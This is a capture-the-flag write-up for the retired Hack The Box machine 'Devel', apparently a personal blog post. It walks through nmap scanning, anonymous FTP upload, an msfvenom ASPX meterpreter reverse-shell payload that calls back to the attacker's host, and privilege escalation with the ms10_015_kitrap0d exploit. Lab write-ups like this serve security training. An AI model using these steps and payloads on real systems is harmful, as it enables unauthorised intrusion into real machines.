Hello Guys, This is my first HACK-THE-BOX writeup. This write-up is for the retired machine `DEVEL`.

So with out making any delay, we will start with a nmap scan. I always start with a full port scan using below nmap command.

```
nmap -p- --min-rate 5000 10.10.10.5 -oA nmap/fullport
```

![nmap scan](/assets/img/htb-devel/fullport.png)

Then we will go for another scan with `A` flag and for specific open ports.

```
nmap -p 21,80 -A 10.10.14.3 -oA nmap/portscan
```

![portscan](/assets/img/htb-devel/portscan.png)

So we can see here port 21/TCP - FTP and 80/TCP - HTTP are open.

For port 21, we can see that anonymous login is enabled. Let's login to port 21.

```
ftp 10.10.10.5
```

![ftp](/assets/img/htb-devel/ftp.png)

Checked the directory aspnet_client but there's nothing much useful.

Now we can check the port 80 and see if we find anything useful. Opened the site in a web browser and found a default IIS7 page. It contains an image, when we check the image name in source page it is welcome.png.

From the ftp directory listing we saw that there was a png file with name "wecome.png". Let's upload a file to ftp and see if we can access that from port 80. 

![ftptest](/assets/img/htb-devel/ftptest.png)

And yes, that was accessible. Now we can load a aspx meterpreter payload and try to get a reverseshell.

Let's generate a payload using msfvenom.
```
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.14.3 LPORT=9999 -f aspx > shell.aspx 
```

Now the payload can be uploaded to the server using ftp.

![ftpupload](/assets/img/htb-devel/ftpupload.png)

Let's open a metasploit listener for the payload. We have to set the options as per the msfvenom command.

![meterpreter](/assets/img/htb-devel/meterpreter.png)

Now try to access the `shell.aspx` page and boom. We got the meterpreter session open for us. 

![shell](/assets/img/htb-devel/shell.png)

But unfortunately we can't access the user directory. So we have to go for the privilege escalation. For that we can look for the `suggester` in metasploit. We can set the session to our open meterpreter session and hit `run`.

![suggested](/assets/img/htb-devel/suggested.png)

We can try the exploits and see if we get the root access. While trying each exploit, I found that `windows/local/ms10_015_kitrap0d` seems to be working fine for me and I got the root access.

![root](/assets/img/htb-devel/root.png)

Let's look for the flags.

![flags](/assets/img/htb-devel/flags.png)

That's all about this write-up. Thanks for reading.
